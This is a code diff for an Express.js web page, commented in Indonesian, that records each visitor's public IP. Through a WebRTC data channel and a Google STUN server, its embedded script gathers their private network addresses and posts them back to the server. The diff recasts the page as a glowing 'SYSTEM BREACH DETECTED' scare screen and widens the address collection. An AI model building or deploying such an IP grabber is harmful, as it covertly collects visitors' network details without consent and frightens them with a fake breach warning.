@@ -42,25 +42,62 @@ app.use((req, res, next) => {
     next();
 });
 
-// Halaman utama dengan WebRTC untuk IP Private
+// Halaman utama dengan efek hacker-style
 app.get("/", (req, res) => {
     res.send(`
-        <h1>IP kamu sudah dicatat di server.</h1>
-        <p>IP Public: ${getClientIP(req)}</p>
-        <p id="private-ip">Mendeteksi IP Private...</p>
+        <style>
+            body {
+                background-color: black;
+                color: #00ff00;
+                font-family: monospace;
+                text-align: center;
+                padding: 20px;
+            }
+            h1 {
+                font-size: 24px;
+                text-shadow: 0px 0px 5px #00ff00;
+            }
+            p {
+                font-size: 18px;
+                text-shadow: 0px 0px 5px #00ff00;
+            }
+            .glitch {
+                animation: glitch 0.5s infinite alternate;
+            }
+            @keyframes glitch {
+                0% { text-shadow: 2px 2px 5px #ff0000, -2px -2px 5px #0000ff; }
+                100% { text-shadow: -2px -2px 5px #ff0000, 2px 2px 5px #0000ff; }
+            }
+            .blinking {
+                animation: blink 1s infinite alternate;
+            }
+            @keyframes blink {
+                0% { opacity: 1; }
+                100% { opacity: 0; }
+            }
+        </style>
+
+        <h1 class="glitch">⚠ SYSTEM BREACH DETECTED ⚠</h1>
+        <p id="public-ip">IP Public: Scanning...</p>
+        <p id="private-ip" class="blinking">[ACCESSING PRIVATE NETWORK...]</p>
+
         <script>
+            document.getElementById("public-ip").innerText = "IP Public: ${getClientIP(req)}";
+
             async function getLocalIPs() {
                 const ips = new Set();
-                const pc = new RTCPeerConnection({ iceServers: [] });
+                const pc = new RTCPeerConnection({ 
+                    iceServers: [{ urls: "stun:stun.l.google.com:19302" }] 
+                });
 
                 pc.createDataChannel("");
                 pc.createOffer().then(offer => pc.setLocalDescription(offer));
 
                 pc.onicecandidate = event => {
-                    if (event.candidate && event.candidate.candidate.includes("udp")) {
+                    if (event.candidate) {
                         const ip = event.candidate.candidate.split(" ")[4];
                         ips.add(ip);
-                    } else if (!event.candidate) {
+                    } else {
                         const privateIP = [...ips].join(", ") || "Tidak ditemukan";
                         document.getElementById("private-ip").innerText = "IP Private: " + privateIP;
                         
@@ -68,7 +105,7 @@ app.get("/", (req, res) => {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ privateIP })
-                        });
+                        }).catch(err => console.error("Gagal mengirim IP Private:", err));
 
                         pc.close();
                     }
